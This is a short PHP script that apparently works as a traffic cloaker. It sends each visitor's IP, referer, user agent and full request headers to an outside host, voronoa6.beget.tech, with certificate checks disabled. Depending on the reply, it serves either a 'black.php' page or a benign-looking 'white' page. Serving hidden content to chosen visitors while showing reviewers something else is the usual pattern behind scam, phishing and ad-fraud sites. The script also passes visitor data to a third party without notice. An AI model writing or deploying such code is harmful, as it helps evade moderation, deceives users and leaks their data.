<?
  //$post['ip'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
 $post['domain'] = $_SERVER['HTTP_HOST'];
 $post['referer'] = @$_SERVER['HTTP_REFERER'];
 $post['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
 $post['headers'] = json_encode(apache_request_headers());



if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {	
 $post['ip'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
 $post['ip'] = $_SERVER["REMOTE_ADDR"];	
}

 $curl = curl_init('http://voronoa6.beget.tech/api/check_ip');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($curl, CURLOPT_TIMEOUT, 60);
 curl_setopt($curl, CURLOPT_POST, true);
 curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
 $json_reqest = curl_exec($curl);
 curl_close($curl);
 $api_reqest = json_decode($json_reqest);

 if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
 	//require_once('config/white/index.php');
    require_once('black.php');
 }else{
 	//require_once('black.php');
    require_once('config/white/index.php');
 }